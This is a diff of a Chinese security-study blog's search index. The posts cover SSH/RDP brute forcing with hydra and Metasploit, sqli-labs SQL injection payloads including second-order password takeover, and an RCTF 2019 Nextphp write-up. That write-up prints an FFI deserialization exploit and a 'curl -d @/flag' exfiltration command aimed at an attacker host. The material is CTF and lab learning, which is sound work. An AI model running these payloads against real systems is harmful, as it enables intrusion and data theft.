-<h4 id="burp爆破"><a href="#burp爆破" class="headerlink" title="burp爆破"></a>burp爆破</h4><p>之前就使用过很多了，补充一些不知道的功能。<br>Pitchfork(叉子模式)<br>设置几组变量，就有几组payload，请求数量是最小payload组中的payload数量。<br>Cluster bomb(炸弹模式)<br>与鱼叉类似，不过不是一一对应，而是一对多，循环搭配组合，请求数量是各payload数量的乘积。</p>
-]]></content>
-      <tags>
-        <tag>暴力破解</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>web</title>
     <url>/2021/02/26/web/</url>
     <content><![CDATA[<p>复习：上传木马 攻击成功必须满足三个条件：<br><strong>1、木马能成功上传到服务器<br>2、知道木马上传到服务器的路径<br>3、上传的木马能被解析执行</strong></p>
@@ -1859,6 +1841,24 @@ EOF;
       </tags>
   </entry>
   <entry>
+    <title>Weak Password Burst</title>
+    <url>/2021/01/24/wepd/</url>
+    <content><![CDATA[<h3 id="弱口令破解登陆目标服务器"><a href="#弱口令破解登陆目标服务器" class="headerlink" title="弱口令破解登陆目标服务器"></a>弱口令破解登陆目标服务器</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><pre><code>nmap
+20:ssh 80:http
+</code></pre>
+<span id="more"></span>
+
+<h4 id="SSH爆破之字典"><a href="#SSH爆破之字典" class="headerlink" title="SSH爆破之字典"></a>SSH爆破之字典</h4><ul>
+<li>Cewl制作字典<br><code>cewl -d 2 -m 5 -w word.txt 网址</code><br>根据提供信息，随机生成一套弱口令密码,密码制作网站:<br><a href="https://bugku.com/mima/">https://bugku.com/mima/</a> <h4 id="Hydra爆破SSH"><a href="#Hydra爆破SSH" class="headerlink" title="Hydra爆破SSH"></a>Hydra爆破SSH</h4>kali自带<br>hydra -I 用户名(-L 用户名字典) -p 密码(-P word.txt) 网址 -s 端口(开放状态) ssh -f(找到一个终止)<h4 id="MSF模块爆破SSH"><a href="#MSF模块爆破SSH" class="headerlink" title="MSF模块爆破SSH"></a>MSF模块爆破SSH</h4><code>search login</code>关于登陆相关模块<br><code>use auxiliary/scanner/ssh/ssh_login</code><br><code>set rhosts 目标ip</code><br><code>set rport 端口</code><br><code>set username root</code><br><code>set pass_file/root/Desktop/word.txt</code><br><code>set threads 10</code><br><code>run</code><h4 id="Hydra爆破RDP-远程桌面协议"><a href="#Hydra爆破RDP-远程桌面协议" class="headerlink" title="Hydra爆破RDP(远程桌面协议)"></a>Hydra爆破RDP(远程桌面协议)</h4>爆破电脑解锁密码<h4 id="爆破工具"><a href="#爆破工具" class="headerlink" title="爆破工具"></a>爆破工具</h4></li>
+</ul>
+<p>御剑RDP爆破工具<br>超级弱口令检查工具</p>
+<h4 id="burp爆破"><a href="#burp爆破" class="headerlink" title="burp爆破"></a>burp爆破</h4><p>之前就使用过很多了，补充一些不知道的功能。<br>Pitchfork(叉子模式)<br>设置几组变量，就有几组payload，请求数量是最小payload组中的payload数量。<br>Cluster bomb(炸弹模式)<br>与鱼叉类似，不过不是一一对应，而是一对多，循环搭配组合，请求数量是各payload数量的乘积。</p>
+]]></content>
+      <tags>
+        <tag>暴力破解</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XSS</title>
     <url>/2021/01/08/xss/</url>
     <content><![CDATA[<p><strong>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上是一种注入攻击，<br>是指黑客在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在浏览器执行，如获取用户cookie信息。<br>需要强调的是，XSS不仅仅限制于JavaScript，还包括flash等其他脚本语言。<br>根据恶意代码是否存储在服务器中，XSS可分为存储型XSS和反射型XSS。</strong></p>
@@ -1911,6 +1911,19 @@ EOF;
       <tags>
         <tag>PHP伪协议</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>博客优化</title>
+    <url>/2020/11/06/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96/</url>
+    <content><![CDATA[<h4 id="博客主题"><a href="#博客主题" class="headerlink" title="博客主题"></a>博客主题</h4><span id="more"></span>
+
+<p>—第一步：git clone <a href="https://github.com/theme-next/hexo-theme-next">https://github.com/theme-next/hexo-theme-next</a> themes/next 运行下载主题</p>
+<p>—第二步：打开设置站点的_config.yml(注意区分站点和主题文件位置)，找到theme，改成theme：next；</p>
+<h4 id="博客内容的编写"><a href="#博客内容的编写" class="headerlink" title="博客内容的编写"></a>博客内容的编写</h4><p>—-运行命令   hexo new page<br>       在source-_posts内找到page.md打开在记事本编辑即可</p>
+<h4 id="博客网站更名、语言、作者"><a href="#博客网站更名、语言、作者" class="headerlink" title="博客网站更名、语言、作者"></a>博客网站更名、语言、作者</h4><p>—-打开_config.yml 找到 title：xxx</p>
+<p>—-同样找到  language：zh-CN # 即可改为中文 </p>
+<p>—-author：xxx</p>
+]]></content>
   </entry>
   <entry>
     <title>攻防学习</title>
@@ -1991,19 +2004,6 @@ EOF;
       </tags>
   </entry>
   <entry>
-    <title>博客优化</title>
-    <url>/2020/11/06/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96/</url>
-    <content><![CDATA[<h4 id="博客主题"><a href="#博客主题" class="headerlink" title="博客主题"></a>博客主题</h4><span id="more"></span>
-
-<p>—第一步：git clone <a href="https://github.com/theme-next/hexo-theme-next">https://github.com/theme-next/hexo-theme-next</a> themes/next 运行下载主题</p>
-<p>—第二步：打开设置站点的_config.yml(注意区分站点和主题文件位置)，找到theme，改成theme：next；</p>
-<h4 id="博客内容的编写"><a href="#博客内容的编写" class="headerlink" title="博客内容的编写"></a>博客内容的编写</h4><p>—-运行命令   hexo new page<br>       在source-_posts内找到page.md打开在记事本编辑即可</p>
-<h4 id="博客网站更名、语言、作者"><a href="#博客网站更名、语言、作者" class="headerlink" title="博客网站更名、语言、作者"></a>博客网站更名、语言、作者</h4><p>—-打开_config.yml 找到 title：xxx</p>
-<p>—-同样找到  language：zh-CN # 即可改为中文 </p>
-<p>—-author：xxx</p>
-]]></content>
-  </entry>
-  <entry>
     <title>sqli-labs18、19、20</title>
     <url>/2020/12/04/sqli-labs/18~19/</url>
     <content><![CDATA[<h3 id="头部注入"><a href="#头部注入" class="headerlink" title="头部注入"></a>头部注入</h3><p><strong>usename，password被过滤了</strong></p>
@@ -2074,18 +2074,6 @@ Referer:发出请求的页面的URI。
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs24</title>
-    <url>/2020/12/10/sqli-labs/24/</url>
-    <content><![CDATA[<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>原理:<strong>在http请求中提交恶意输入，保存到数据库中，第二次提交http请求，构造sql语句注入,虽然参数在过滤后会添加\进行转义，但是\并不会插入到数据库中，这样就可以利用这个构造一个二次注入。</strong></p>
-<span id="more"></span>
-
-<p>最开始尝试了登陆，按照页面的反应进行操作，就是注册登陆，还有修改自己的原密码。<br>也不知道是要做什么，看了源代码，也是一脸懵逼，只好借鉴大佬了。<br>出现频率最高的代：<strong>session_start()函数</strong><br>session_start() 会创建新会话或者重用现有会话。 如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID， 则会重用现有会话。<br>session_start的作用是开启$_SESION,需要在$_SESION使用之前调用。<br>PHP $_SESION 变量用于存储关于用户会话（session）的信息<br><strong>mysql_real_escape_string() 函数：</strong><br><strong>mysql_real_escape_string(string,connection)</strong><br><strong>string:必需，规定要转义的字符</strong><br><strong>connection:可选，规定MySQL连接</strong><br>下列字符受影响：<br>\x00<br>\n<br>\r<br><br>‘<br>“<br>\x1a<br>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。<br><img src="/2020/12/10/sqli-labs/24/3.png">username,password，re_password字段所投递的字符都被转义了，重心就放在修改密码的sql语句中。<br><strong>在查看源代码时，特别注意sql语句,注入点在修改密码上。</strong><br><img src="/2020/12/10/sqli-labs/24/0.png"><br><strong>重点：从session中直接获得了当前用户名，且被直接用于更新语句并未做检查。</strong><br><strong>从根本上来说，插入数据时没有过滤，只是做了转义处理。</strong><br><strong>若当前用户名中含有注释，便可以修改当前用户名中包含的另一用户的密码，例如注册用户：Dumb’# 那么他就可以修改用户Dumb的密码。</strong><br><img src="/2020/12/10/sqli-labs/24/4.png"><br>思路：<strong>注意到修改密码的sql语句，我们就可以创建一个含同名含单引号注释符的用户名来修改原来用户名的密码。</strong><br><strong>原SQL语句：<br><code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39;</code><br>修改密码sql语句：<br><code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39;</code><br>最后真正执行的sql语句：<br><code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;</code></strong><br>操作：<br>注册好后登陆,就能修改密码了更新成功。<br>先创建一个和admin类似的用户名(admin’#)<br><img src="/2020/12/10/sqli-labs/24/1.png"><br>登陆后，进入修改密码页面修改，成功篡改其他用户的密码。<br><img src="/2020/12/10/sqli-labs/24/2.png"></p>
-]]></content>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqli-labs23</title>
     <url>/2020/12/09/sqli-labs/23/</url>
     <content><![CDATA[<p>又回到get类型了，输入<code>?id=1&#39;</code>只有加单引号的报错，尝试以前的方法都行不通，肯定有了新花样，查看源码。</p>
@@ -2107,6 +2095,18 @@ Referer:发出请求的页面的URI。
 <h3 id="还有，联合查询中还能加报错语句。"><a href="#还有，联合查询中还能加报错语句。" class="headerlink" title="还有，联合查询中还能加报错语句。"></a>还有，联合查询中还能加报错语句。</h3><pre><code>`?id=1&#39; union select 1 ,(updatexml(1,concat(0x7c,(select concat(username,password) from users limit 0,1)),1)),&#39;3`
 </code></pre>
 <p><img src="/2020/12/09/sqli-labs/23/10.png"><br>一般不会这样，有时候不知道哪个字段有回显，而且回报的数据还会被限制长度，还不如直接联合查询注入。</p>
+]]></content>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs24</title>
+    <url>/2020/12/10/sqli-labs/24/</url>
+    <content><![CDATA[<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>原理:<strong>在http请求中提交恶意输入，保存到数据库中，第二次提交http请求，构造sql语句注入,虽然参数在过滤后会添加\进行转义，但是\并不会插入到数据库中，这样就可以利用这个构造一个二次注入。</strong></p>
+<span id="more"></span>
+
+<p>最开始尝试了登陆，按照页面的反应进行操作，就是注册登陆，还有修改自己的原密码。<br>也不知道是要做什么，看了源代码，也是一脸懵逼，只好借鉴大佬了。<br>出现频率最高的代：<strong>session_start()函数</strong><br>session_start() 会创建新会话或者重用现有会话。 如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID， 则会重用现有会话。<br>session_start的作用是开启$_SESION,需要在$_SESION使用之前调用。<br>PHP $_SESION 变量用于存储关于用户会话（session）的信息<br><strong>mysql_real_escape_string() 函数：</strong><br><strong>mysql_real_escape_string(string,connection)</strong><br><strong>string:必需，规定要转义的字符</strong><br><strong>connection:可选，规定MySQL连接</strong><br>下列字符受影响：<br>\x00<br>\n<br>\r<br><br>‘<br>“<br>\x1a<br>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。<br><img src="/2020/12/10/sqli-labs/24/3.png">username,password，re_password字段所投递的字符都被转义了，重心就放在修改密码的sql语句中。<br><strong>在查看源代码时，特别注意sql语句,注入点在修改密码上。</strong><br><img src="/2020/12/10/sqli-labs/24/0.png"><br><strong>重点：从session中直接获得了当前用户名，且被直接用于更新语句并未做检查。</strong><br><strong>从根本上来说，插入数据时没有过滤，只是做了转义处理。</strong><br><strong>若当前用户名中含有注释，便可以修改当前用户名中包含的另一用户的密码，例如注册用户：Dumb’# 那么他就可以修改用户Dumb的密码。</strong><br><img src="/2020/12/10/sqli-labs/24/4.png"><br>思路：<strong>注意到修改密码的sql语句，我们就可以创建一个含同名含单引号注释符的用户名来修改原来用户名的密码。</strong><br><strong>原SQL语句：<br><code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39;</code><br>修改密码sql语句：<br><code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39;</code><br>最后真正执行的sql语句：<br><code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;</code></strong><br>操作：<br>注册好后登陆,就能修改密码了更新成功。<br>先创建一个和admin类似的用户名(admin’#)<br><img src="/2020/12/10/sqli-labs/24/1.png"><br>登陆后，进入修改密码页面修改，成功篡改其他用户的密码。<br><img src="/2020/12/10/sqli-labs/24/2.png"></p>
 ]]></content>
       <tags>
         <tag>SQL注入</tag>
@@ -2503,6 +2503,36 @@ null记录总数，可用`select coalesce (表中字段名，&#39;任意你想�
       </tags>
   </entry>
   <entry>
+    <title>MYSQL注入相关学习</title>
+    <url>/2020/11/17/sqli-labs/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>与MySQL相关知识点     </p>
+<span id="more"></span>
+
+<pre><code>MySQL默认存放一个“information_schema”的数据库
+记住三个表名“schemata、tables、columns”
+schemata表储存该用户创建所有数据库的库名，记住schema_name（数据库库名的字段名）。
+tables表储存该用户创建所有数据库的库名和表名，记住table_schema(数据库库名)和table_name(表名的字段名)
+colunms表储存该用户所有数据库的库名、表名、字段名 记住table_schema(数据库库名)、table_name（表名）、column_name（字段名的字段名）。
+</code></pre>
+<h4 id="1、MySQL查询语句"><a href="#1、MySQL查询语句" class="headerlink" title="1、MySQL查询语句"></a>1、MySQL查询语句</h4><pre><code>select 要查询的字段名 from 库名.表名
+select 要查询的字段名 from 库名.表名 where 已知条件字段名=&#39;已知条件的值&#39;
+知道两个条件时，用and连接。
+</code></pre>
+<h4 id="2、limit-用法"><a href="#2、limit-用法" class="headerlink" title="2、limit 用法"></a>2、limit 用法</h4><pre><code>limit m,n m表示记录开始，0开始为第一条；n指取n条记录。
+</code></pre>
+<h4 id="3、需要记住几个函数"><a href="#3、需要记住几个函数" class="headerlink" title="3、需要记住几个函数"></a>3、需要记住几个函数</h4><pre><code>database():当前网站使用的数据库
+version():当前MySQL版本
+user():当前MySQL用户
+</code></pre>
+<h4 id="4、注释符"><a href="#4、注释符" class="headerlink" title="4、注释符"></a>4、注释符</h4><pre><code>#或--空格或/*/。
+</code></pre>
+<h4 id="5、-内联注释-代码-。"><a href="#5、-内联注释-代码-。" class="headerlink" title="5、 内联注释/!代码/。"></a>5、 内联注释/<em>!代码</em>/。</h4><h3 id="union-注入攻击"><a href="#union-注入攻击" class="headerlink" title="union 注入攻击"></a>union 注入攻击</h3><p>使用联合查询注入 sql1 union sql2 字段数要一致，不然会报错。</p>
+]]></content>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQLMAP</title>
     <url>/2020/12/01/sqli-labs/sqlmap2/</url>
     <content><![CDATA[<p>在对sqlmap进一步了解。</p>
@@ -2550,36 +2580,6 @@ select count(*),concat((select database()),floor(rand()*2))as a from information
 `(select 1 from (select count(*),concat((select database()),floor(rand()*2))x from information_schema.tables group by x)a);`
 </code></pre>
 <p><img src="/2020/11/19/sqli-labs/%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/8.png">        </p>
-]]></content>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MYSQL注入相关学习</title>
-    <url>/2020/11/17/sqli-labs/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<p>与MySQL相关知识点     </p>
-<span id="more"></span>
-
-<pre><code>MySQL默认存放一个“information_schema”的数据库
-记住三个表名“schemata、tables、columns”
-schemata表储存该用户创建所有数据库的库名，记住schema_name（数据库库名的字段名）。
-tables表储存该用户创建所有数据库的库名和表名，记住table_schema(数据库库名)和table_name(表名的字段名)
-colunms表储存该用户所有数据库的库名、表名、字段名 记住table_schema(数据库库名)、table_name（表名）、column_name（字段名的字段名）。
-</code></pre>
-<h4 id="1、MySQL查询语句"><a href="#1、MySQL查询语句" class="headerlink" title="1、MySQL查询语句"></a>1、MySQL查询语句</h4><pre><code>select 要查询的字段名 from 库名.表名
-select 要查询的字段名 from 库名.表名 where 已知条件字段名=&#39;已知条件的值&#39;
-知道两个条件时，用and连接。
-</code></pre>
-<h4 id="2、limit-用法"><a href="#2、limit-用法" class="headerlink" title="2、limit 用法"></a>2、limit 用法</h4><pre><code>limit m,n m表示记录开始，0开始为第一条；n指取n条记录。
-</code></pre>
-<h4 id="3、需要记住几个函数"><a href="#3、需要记住几个函数" class="headerlink" title="3、需要记住几个函数"></a>3、需要记住几个函数</h4><pre><code>database():当前网站使用的数据库
-version():当前MySQL版本
-user():当前MySQL用户
-</code></pre>
-<h4 id="4、注释符"><a href="#4、注释符" class="headerlink" title="4、注释符"></a>4、注释符</h4><pre><code>#或--空格或/*/。
-</code></pre>
-<h4 id="5、-内联注释-代码-。"><a href="#5、-内联注释-代码-。" class="headerlink" title="5、 内联注释/!代码/。"></a>5、 内联注释/<em>!代码</em>/。</h4><h3 id="union-注入攻击"><a href="#union-注入攻击" class="headerlink" title="union 注入攻击"></a>union 注入攻击</h3><p>使用联合查询注入 sql1 union sql2 字段数要一致，不然会报错。</p>
 ]]></content>
       <tags>
         <tag>SQL注入</tag>
@@ -3034,6 +3034,47 @@ user():当前MySQL用户
 <p>在绕过创建文件还有一个方法，在设计 组件的素材库可以上传文件，我们先随意上传一个txt文件，再编辑，修改文件名称，也是通过路径穿越，修改为</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../system/tmp/akiq</span><br></pre></td></tr></table></figure>
 
+
+
+
+
+
+
+<h2 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h2><p>这一看就有点像前几天陈学长给21届新生出的一道新手题目。</p>
+<p>查看一下phpinfo信息，<strong>PHP Version 7.4.0-dev</strong></p>
+<p>看了一下disable_functions，禁用的很多函数。</p>
+<p>我们找一下根目录下有没有放着什么东西。</p>
+<p>传入：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=var_dump(scandir(&#x27;./&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p>发现了preload.php文件，我们读取一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=show_source(&#x27;preload.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;print_r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;ret&#x27;</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;func&#x27;</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, <span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> (<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[<span class="variable">$key</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> (<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>应该是个反序列化问题，先看看[Serializable](<a href="https://wiki.php.net/rfc/custom_object_serialization">PHP： rfc：custom_object_serialization</a>)。</p>
+<p>这是属于比较新的机制，自定义的序列化，<em><strong>如果一个类同时实现Serializable和__Serialize（）/__Unserialize（），则序列化更倾向于新机制，而序列化则使用其中一种，取决于使用的格式是C（Serializable）还是O（Uu unserialize），所以C格式编码的旧的字符仍可以解码，新的字符串则以O格式生成</strong></em></p>
+<p>所以后面生成的序列化是C格式，同时会先执行Serializable接口中的方法，还要删除__serialize()和__unserialize()，不然会优先触发这两个函数</p>
+<p>看了PHP版本很新，要怎么绕过禁用函数，需要使用到[FFI扩展](<a href="https://www.php.net/manual/zh/ffi.cdef.php">PHP: FFI::cdef - Manual</a>)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果FFI.cdef没有第二个参数，会在全局查找，第一个参数所声明的符号。意思就是其在不传入第二个参数时，可以直接调用php代码。所以我们在声明后，即可加入php代码.</span><br><span class="line">方法：实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions</span><br></pre></td></tr></table></figure>
+
+<p>编写EXP:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        &#x27;ret&#x27; =&gt; null,</span><br><span class="line">        &#x27;func&#x27; =&gt; &#x27;FFI::cdef&#x27;,                          </span><br><span class="line">        &#x27;arg&#x27; =&gt; &#x27;int system(const char *command);&#x27;     //声明</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data = unserialize($payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A();</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br></pre></td></tr></table></figure>
+
+<p>由于执行命令没有回显，需要挂VPS会比较麻烦</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=$a=unserialize(&#x27;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&#x27;)-&gt;__serialize()[&#x27;ret&#x27;]-&gt;system(&#x27;curl -d @/flag linux靶机ip:8888&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>还有更简单的方法，将文件写入一个文本中：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?$a=unserialize(&#x27;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&#x27;)-&gt;__serialize()[&#x27;ret&#x27;]-&gt;system(&#x27;cat /flag&gt;/var/www/html/1.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考：</p>
+<p><a href="https://www.cnblogs.com/karsa/p/13393034.html">Nextphp - kar3a - 博客园</a></p>
+<p><a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp">RCTF2019Web题解之nextphp | Mochazz’s blog</a></p>
+<p><a href="https://blog.csdn.net/fmyyy1/article/details/116998001">RCTF 2019]Nextphp_fmyyy1的博客-CSDN博客</a></p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
